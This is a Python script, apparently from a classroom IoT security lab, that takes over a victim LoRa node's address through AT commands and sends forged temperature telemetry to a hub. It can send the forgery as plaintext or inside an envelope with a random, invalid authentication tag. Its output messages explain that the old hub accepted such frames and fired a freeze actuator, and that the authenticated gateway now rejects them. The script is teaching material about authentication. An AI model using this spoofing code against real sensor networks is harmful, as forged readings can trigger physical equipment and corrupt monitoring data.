#!/usr/bin/env python3
"""Inject a forged frame under a victim node address to teach authentication.

Spoof.py is the classroom data-injection demonstration. It claims the
victim's LoRa address on the physical transceiver and transmits a crafted
frame that the old hub trusted and logged, triggering the freeze actuator
reply as though the victim node reported a false emergency. Against the
authenticated gateway the same attack is rejected because the spoofing tool
holds no field key and cannot produce a valid XChaCha20-Poly1305 envelope.
"""

import argparse
import json
import secrets
import sys
import time

try:
    import serial
except ImportError as exc:
    raise SystemExit(
        "pip install pyserial to run the COLD_CHAIN_MONITOR spoof tool"
    ) from exc

HUB_ADDRESS = "0001"
NONCE_LEN = 24
TAG_LEN = 16


def _parse_args():
    """Parse spoof tool command-line arguments.

    Parameters
    ----------
    None

    Returns
    -------
    argparse.Namespace
        Parsed spoof tool arguments.
    """
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", required=True, help="Serial port device")
    parser.add_argument("--baud", type=int, default=115200,
                        help="Radio baud rate")
    _add_forge_args(parser)
    return parser.parse_args()


def _add_forge_args(parser):
    """Add the forged telemetry and attack-mode options.

    Parameters
    ----------
    parser : argparse.ArgumentParser
        Parser receiving the forged field options.

    Returns
    -------
    None
    """
    parser.add_argument("--victim", required=True,
                        help="Victim node address in hex")
    parser.add_argument("--temp", type=int, default=-80,
                        help="Forged temperature in tenths Celsius")
    parser.add_argument("--hum", type=int, default=500,
                        help="Forged humidity in tenths percent")
    parser.add_argument("--seq", type=int, default=1,
                        help="Forged sequence number")
    parser.add_argument("--mode", choices=("plaintext", "bad-tag"),
                        default="plaintext",
                        help="Forged plaintext frame or broken envelope tag")


def _payload(node, seq, temp, hum):
    """Build the forged fixed-field telemetry JSON body.

    Parameters
    ----------
    node : int
        Victim node identifier.
    seq : int
        Forged sequence number.
    temp : int
        Forged temperature in tenths Celsius.
    hum : int
        Forged humidity in tenths percent.

    Returns
    -------
    str
        Compact JSON telemetry payload.
    """
    return json.dumps({"n": node, "s": seq, "t": temp, "h": hum},
                      separators=(",", ":"))


def _set_spoof_address(ser, victim):
    """Claim the victim address on the local transceiver.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    victim : str
        Victim node address in hex.

    Returns
    -------
    None
    """
    cmd = f"AT+ADDRESS={int(victim, 16)}\r\n".encode("utf-8")
    ser.write(cmd)
    ser.flush()


def _send_spoof(ser, payload):
    """Transmit the forged frame to the instructor hub.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    payload : str
        Forged frame text, either JSON or a broken hex envelope.

    Returns
    -------
    None
    """
    cmd = f"AT+SEND={HUB_ADDRESS},{len(payload)},{payload}\r\n"
    ser.write(cmd.encode("utf-8"))
    ser.flush()


def _forged_envelope(body):
    """Wrap forged JSON in a structurally plausible but invalid envelope.

    Parameters
    ----------
    body : str
        Forged JSON telemetry body.

    Returns
    -------
    str
        Lowercase hex nonce, forged body, and random tag bytes.
    """
    nonce = secrets.token_bytes(NONCE_LEN)
    tag = secrets.token_bytes(TAG_LEN)
    return (nonce + body.encode("utf-8") + tag).hex()


def _frame(args):
    """Build the forged wire frame for the selected attack mode.

    Parameters
    ----------
    args : argparse.Namespace
        Parsed spoof tool arguments.

    Returns
    -------
    str
        Forged frame text sent to the instructor hub.
    """
    body = _payload(int(args.victim, 16), args.seq, args.temp, args.hum)
    if args.mode == "bad-tag":
        return _forged_envelope(body)
    return body


def main():
    """Inject the forged frame under the victim address.

    Parameters
    ----------
    None

    Returns
    -------
    int
        Zero on successful injection.
    """
    args = _parse_args()
    frame = _frame(args)
    with serial.Serial(args.port, args.baud, timeout=1.0) as ser:
        _set_spoof_address(ser, args.victim)
        time.sleep(0.2)
        _send_spoof(ser, frame)
    print(f"Injected forged {args.mode} frame as node 0x{args.victim} "
          f"({args.temp} tenths C)")
    print("Before authentication this frame landed as truth and fired the "
          "freeze actuator.")
    print("The authenticated gateway now rejects it as UNAUTHENTICATED and "
          "never parses the forged JSON.")
    print("The spoof tool holds no field key, so it cannot seal a valid "
          "envelope for the victim.")
    return 0


if __name__ == "__main__":
    sys.exit(main())